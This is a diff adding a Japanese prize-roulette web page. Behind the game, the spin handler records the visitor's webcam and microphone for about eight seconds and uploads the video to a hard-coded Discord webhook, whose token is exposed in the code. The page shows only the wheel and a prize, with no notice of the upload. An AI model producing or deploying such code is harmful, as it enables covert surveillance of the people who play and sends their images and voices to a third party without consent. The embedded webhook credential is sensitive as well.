@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>録画付きルーレット</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 50px;
+      background: #f5f5f5;
+    }
+    #pointer {
+      width: 0;
+      height: 0;
+      border-left: 20px solid transparent;
+      border-right: 20px solid transparent;
+      border-top: 30px solid red;
+      margin: 0 auto 10px;
+    }
+    #wheelCanvas {
+      border-radius: 50%;
+      margin: 0 auto;
+      display: block;
+      background: white;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    }
+    #spinButton {
+      margin-top: 25px;
+      font-size: 1.6em;
+      padding: 16px 40px;
+      background-color: #2196F3;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+      cursor: pointer;
+    }
+    #result {
+      margin-top: 20px;
+      font-size: 1.5em;
+      font-weight: bold;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="pointer"></div>
+  <canvas id="wheelCanvas" width="400" height="400"></canvas>
+
+  <button id="spinButton" onclick="startSpin()">🎲 回す！</button>
+
+  <div id="result"> </div>
+
+  <script>
+    const items = [
+      { label: '30ロバ', weight: 3 },
+      { label: '20ロバ', weight: 5 },
+      { label: '10ロバ', weight: 8 },
+      { label: '50ロバ', weight: 2 },
+      { label: '100ロバ', weight: 0.5 },
+      { label: '1000ロバ', weight: 0.2 }
+    ];
+    const colors = ['#FFD54F', '#FFB74D', '#4FC3F7', '#81C784', '#F06292', '#BA68C8', '#A1887F'];
+    const canvas = document.getElementById('wheelCanvas');
+    const ctx = canvas.getContext('2d');
+    const resultBox = document.getElementById("result");
+    let currentRotation = 0;
+    let spinning = false;
+
+    const totalWeight = items.reduce((sum, item) => sum + item.weight, 0);
+    const anglePerWeight = 360 / totalWeight;
+
+    function drawWheel(rotationDeg = 0) {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      const centerX = canvas.width / 2;
+      const centerY = canvas.height / 2;
+      const radius = 180;
+      let currentAngle = 0;
+
+      ctx.save();
+      ctx.translate(centerX, centerY);
+      ctx.rotate((rotationDeg - 90) * Math.PI / 180);
+
+      for (let i = 0; i < items.length; i++) {
+        const angle = anglePerWeight * items[i].weight;
+        const startAngle = currentAngle * Math.PI / 180;
+        const endAngle = (currentAngle + angle) * Math.PI / 180;
+
+        ctx.beginPath();
+        ctx.moveTo(0, 0);
+        ctx.arc(0, 0, radius, startAngle, endAngle);
+        ctx.fillStyle = colors[i % colors.length];
+        ctx.fill();
+
+        const textAngle = (currentAngle + angle / 2) * Math.PI / 180;
+        ctx.save();
+        ctx.rotate(textAngle);
+        ctx.textAlign = "right";
+        ctx.fillStyle = "#000";
+        ctx.font = "16px sans-serif";
+        ctx.fillText(items[i].label, radius - 10, 5);
+        ctx.restore();
+
+        currentAngle += angle;
+      }
+
+      ctx.restore();
+    }
+
+    drawWheel();
+
+    async function startSpin() {
+      if (spinning) return;
+      spinning = true;
+
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.start();
+
+      const selectedIndex = pickRandomItem();
+      let angleBefore = 0;
+      for (let i = 0; i < selectedIndex; i++) {
+        angleBefore += anglePerWeight * items[i].weight;
+      }
+      const angleTarget = angleBefore + (anglePerWeight * items[selectedIndex].weight) / 2;
+
+      const targetRotation = 360 * 6 + angleTarget;
+      const duration = 8000;
+      const start = performance.now();
+
+      function animate(now) {
+        const elapsed = now - start;
+        const progress = Math.min(elapsed / duration, 1);
+        const easeOut = 1 - Math.pow(1 - progress, 3);
+        currentRotation = targetRotation * easeOut;
+        drawWheel(currentRotation);
+
+        if (progress < 1) {
+          requestAnimationFrame(animate);
+        } else {
+          resultBox.textContent = items[selectedIndex].label;
+        }
+      }
+
+      requestAnimationFrame(animate);
+
+      setTimeout(() => {
+        mediaRecorder.stop();
+        stream.getTracks().forEach(track => track.stop());
+
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          const file = new File([blob], "record.webm", { type: "video/webm" });
+
+          const formData = new FormData();
+          formData.append("file", file);
+
+          // ← あなたの Discord Webhook URL に置き換えてね
+          const webhookURL = "https://discord.com/api/webhooks/1381314574640353501/gml-lgI2NN_c2g6lUNZK13fKT05_m88PSNdKAR5vjpqnYttHDj_9YT7Hs5djUTqgCXjY";
+
+          fetch(webhookURL, {
+            method: "POST",
+            body: formData
+          }).then(() => {
+            console.log("🎥 録画送信完了！");
+            // 必要ならページ遷移もここに書ける
+            // window.location.href = "next.html";
+          }).catch(console.error);
+        };
+
+        spinning = false;
+      }, 8000);
+    }
+
+    function pickRandomItem() {
+      const r = Math.random() * totalWeight;
+      let sum = 0;
+      for (let i = 0; i < items.length; i++) {
+        sum += items[i].weight;
+        if (r < sum) return i;
+      }
+      return items.length - 1;
+    }
+  </script>
+</body>
+</html>
